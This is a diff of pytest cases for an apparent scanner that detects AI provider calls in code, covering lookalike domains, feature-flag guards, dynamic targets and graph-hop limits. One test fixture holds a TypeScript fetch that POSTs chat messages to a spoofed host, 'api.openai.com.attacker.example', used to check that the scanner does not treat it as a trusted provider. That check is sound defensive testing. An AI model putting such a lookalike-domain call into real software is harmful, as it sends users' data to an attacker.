@@ -252,6 +252,149 @@ def test_unsupported_source_language_preserves_unresolved_ai_frontier(tmp_path: 
         for item in discovery["findings"]
     )
 
+def test_lookalike_provider_domain_is_not_confirmed(tmp_path: Path) -> None:
+    discovery = _discovery(
+        tmp_path,
+        """
+export async function ask(messages: unknown[]) {
+  return fetch("https://api.openai.com.attacker.example/v1/chat/completions", {
+    method: "POST",
+    body: JSON.stringify({ model: "gpt-5", messages })
+  });
+}
+""",
+    )
+
+    finding = next(item for item in discovery["findings"] if item["kind"] == "OUTBOUND_API")
+    assert discovery["gate"] == "AI_UNKNOWN"
+    assert finding["state"] == "POSSIBLE_AI_CALL"
+    assert "provider" not in finding
+
+
+def test_unrelated_provider_url_in_request_window_does_not_bind_dynamic_target(tmp_path: Path) -> None:
+    discovery = _discovery(
+        tmp_path,
+        """
+export async function forward(target: string, messages: unknown[]) {
+  return fetch(target, {
+    headers: { "x-docs": "https://api.openai.com/v1/chat/completions" },
+    body: JSON.stringify({ model: "custom", messages })
+  });
+}
+""",
+    )
+
+    assert discovery["gate"] == "AI_UNKNOWN"
+    assert not any(
+        item["kind"] == "OUTBOUND_API"
+        and (item.get("provider") or item.get("host"))
+        for item in discovery["findings"]
+    )
+    assert any(
+        item["kind"] == "DYNAMIC_TARGET"
+        and item["clarification_owner"] == "TECHNICAL"
+        for item in discovery["findings"]
+    )
+
+
+def test_nearby_unrelated_feature_flag_is_not_emitted_as_guard(tmp_path: Path) -> None:
+    discovery = _discovery(
+        tmp_path,
+        """
+const aiEnabled = process.env.ENABLE_AI === "true";
+export async function summarize(text: string) {
+  if (aiEnabled) { console.log("telemetry"); }
+  return client.responses.create({ model: process.env.OPENAI_MODEL, input: text });
+}
+""",
+    )
+
+    finding = next(item for item in discovery["findings"] if item["kind"] == "SDK_INVOCATION")
+    assert discovery["gate"] == "AI_CONFIRMED"
+    assert "runtime_guard" not in finding
+
+
+def test_same_line_feature_flag_is_a_verified_guard(tmp_path: Path) -> None:
+    discovery = _discovery(
+        tmp_path,
+        """
+export async function summarize(text: string) {
+  if (process.env.ENABLE_AI) return client.responses.create({ model: "gpt-5", input: text });
+  return text;
+}
+""",
+    )
+
+    finding = next(item for item in discovery["findings"] if item["kind"] == "SDK_INVOCATION")
+    assert discovery["gate"] == "AI_UNKNOWN"
+    assert finding["runtime_guard"] == "ENABLE_AI"
+
+
+def test_go_and_rust_http_sources_remain_partial_until_deterministically_modeled(tmp_path: Path) -> None:
+    cases = (
+        ("client.go", 'http.Post("https://api.openai.com/v1/chat/completions", "application/json", body)\n'),
+        ("client.rs", 'reqwest::Client::new().post("https://api.openai.com/v1/chat/completions").send().await;\n'),
+    )
+    for filename, source in cases:
+        case_dir = tmp_path / filename.replace(".", "-")
+        case_dir.mkdir()
+        discovery = _discovery(case_dir, source, filename=filename)
+        assert discovery["coverage_state"] == "PARTIAL"
+        assert discovery["gate"] == "AI_UNKNOWN"
+        assert discovery["material_unresolved_frontiers"]
+
+
+def test_targeted_scope_does_not_scan_excluded_ai_source(tmp_path: Path) -> None:
+    (tmp_path / "safe.ts").write_text(
+        'export const add = (a: number, b: number) => a + b;\n', encoding="utf-8"
+    )
+    (tmp_path / "excluded.ts").write_text(
+        'client.responses.create({ model: "gpt-5", input: "x" });\n', encoding="utf-8"
+    )
+    scope = ("safe.ts",)
+    program = RepositorySemanticExtractor(tmp_path).extract(include_files=scope)
+    AIInvocationSemanticGate().enrich(program)
+    AIDiscoveryEnricher(tmp_path, include_files=scope).enrich(program)
+    builder = ProgramGraphBuilder(
+        tmp_path, scan_job_id="scan-scope", snapshot_id="snapshot-scope", commit_sha="scope123"
+    )
+    builder.add_program(program)
+    discovery = summarize_ai_discovery(builder.build())
+
+    assert discovery["gate"] == "AI_ABSENT_CONFIRMED"
+    assert discovery["findings"] == []
+
+
+def test_source_seeded_graphql_frontier_is_reconciled_after_trusted_non_ai_resolution(tmp_path: Path) -> None:
+    (tmp_path / "client.ts").write_text(
+        'const client = new GraphQLClient(endpoint);\nclient.request(query);\n',
+        encoding="utf-8",
+    )
+    program = SemanticProgram(
+        nodes=[
+            SemanticNodeFact(
+                "graphql-call", "CALL_SITE", "GraphQLClient", "client.ts", 1, 1
+            ),
+            SemanticNodeFact(
+                "billing-handler", "FUNCTION", "loadInvoices", "billing.ts", 3, 8
+            ),
+        ],
+        edges=[SemanticEdgeFact("RESOLVES_TO", "graphql-call", "billing-handler")],
+    )
+    enricher = AIDiscoveryEnricher(tmp_path)
+    enricher.enrich(program)
+    assert program.unresolved_frontiers
+    enricher.finalize(program)
+    builder = ProgramGraphBuilder(
+        tmp_path, scan_job_id="scan-reconcile", snapshot_id="snapshot-reconcile", commit_sha="abc123"
+    )
+    builder.add_program(program)
+    discovery = summarize_ai_discovery(builder.build())
+
+    assert discovery["gate"] == "AI_ABSENT_CONFIRMED"
+    assert discovery["material_unresolved_frontiers"] == []
+
+
 def _graph_discovery(tmp_path: Path, nodes, edges):
     program = SemanticProgram(nodes=list(nodes), edges=list(edges))
     AIDiscoveryEnricher(tmp_path).finalize(program)
@@ -295,8 +438,14 @@ def test_pge_parameter_and_config_propagation_preserves_ai_frontier(tmp_path: Pa
 
     assert discovery["gate"] == "AI_UNKNOWN"
     assert discovery["material_unresolved_frontiers"]
+    assert not any(
+        item["kind"] == "OUTBOUND_API"
+        and item.get("clarification_owner") == "CUSTOMER"
+        for item in discovery["findings"]
+    )
     assert any(
-        item["kind"] == "OUTBOUND_API" and item["endpoint_source"] == "PGE_MULTI_HOP"
+        item["kind"] == "DYNAMIC_TARGET"
+        and item["clarification_owner"] == "TECHNICAL"
         for item in discovery["findings"]
     )
 
@@ -351,6 +500,97 @@ def test_pge_graphql_grpc_and_cross_language_service_boundaries_are_not_absence(
     kinds = [item["kind"] for item in discovery["findings"]]
     assert "OUTBOUND_API" in kinds
     assert len([item for item in discovery["findings"] if item["kind"] == "OUTBOUND_API"]) >= 2
+
+
+
+def test_graph_walk_does_not_cross_shared_caller_into_sibling_ai_call(tmp_path: Path) -> None:
+    discovery = _graph_discovery(
+        tmp_path,
+        [
+            SemanticNodeFact("caller", "FUNCTION", "run", "app.ts", 1, 10),
+            SemanticNodeFact(
+                "ai",
+                "SDK_CLIENT",
+                "OpenAIClient",
+                "ai.ts",
+                1,
+                1,
+                attributes={"semanticRole": "PROVIDER_OPENAI"},
+            ),
+            SemanticNodeFact("billing", "EXTERNAL_API", "billing API", "billing.ts", 4, 4),
+        ],
+        [
+            SemanticEdgeFact("CALLS", "caller", "ai"),
+            SemanticEdgeFact("CALLS_EXTERNAL", "caller", "billing"),
+        ],
+    )
+
+    assert not any(
+        item["kind"] == "OUTBOUND_API" and item.get("endpoint_source") == "PGE_MULTI_HOP"
+        for item in discovery["findings"]
+    )
+
+
+def test_unresolved_graph_edge_stays_technical_instead_of_customer_confirmation(tmp_path: Path) -> None:
+    discovery = _graph_discovery(
+        tmp_path,
+        [
+            SemanticNodeFact("boundary", "EXTERNAL_API", "gateway", "api.ts", 1, 1),
+            SemanticNodeFact(
+                "unknown",
+                "UNRESOLVED_DYNAMIC_TARGET",
+                "openai messages endpoint",
+                "api.ts",
+                1,
+                1,
+                resolution_state="UNRESOLVED",
+            ),
+        ],
+        [
+            SemanticEdgeFact(
+                "RESOLVES_TO",
+                "boundary",
+                "unknown",
+                coverage_state="LIMITED",
+                resolution_state="UNRESOLVED",
+            )
+        ],
+    )
+
+    assert discovery["gate"] == "AI_UNKNOWN"
+    assert any(item["clarification_owner"] == "TECHNICAL" for item in discovery["findings"])
+    assert not any(
+        item["kind"] == "OUTBOUND_API" and item["clarification_owner"] == "CUSTOMER"
+        for item in discovery["findings"]
+    )
+
+
+def test_exact_hop_limit_without_unseen_neighbor_does_not_create_false_frontier(tmp_path: Path) -> None:
+    nodes = [SemanticNodeFact("boundary", "EXTERNAL_API", "gateway", "api.ts", 1, 1)]
+    edges = []
+    previous = "boundary"
+    for index in range(1, 13):
+        key = f"hop-{index}"
+        nodes.append(SemanticNodeFact(key, "FUNCTION", f"hop{index}", "api.ts", index + 1, index + 1))
+        edges.append(SemanticEdgeFact("CALLS", previous, key))
+        previous = key
+    nodes.append(
+        SemanticNodeFact(
+            "ai-capability", "AI_CAPABILITY", "openai messages", "api.ts", 20, 20
+        )
+    )
+    # Replace the final ordinary hop with the trusted AI endpoint exactly at depth 12.
+    edges[-1] = SemanticEdgeFact("CALLS", "hop-11", "ai-capability")
+    nodes = [node for node in nodes if node.key != "hop-12"]
+
+    discovery = _graph_discovery(tmp_path, nodes, edges)
+
+    assert not any(
+        "MAX_GRAPH_HOPS_REACHED" in str(item)
+        for item in discovery["findings"]
+    )
+    assert discovery["material_unresolved_frontiers"] == []
+
 
 
 def test_generic_graphql_transport_without_ai_semantics_still_allows_absence(tmp_path: Path) -> None:
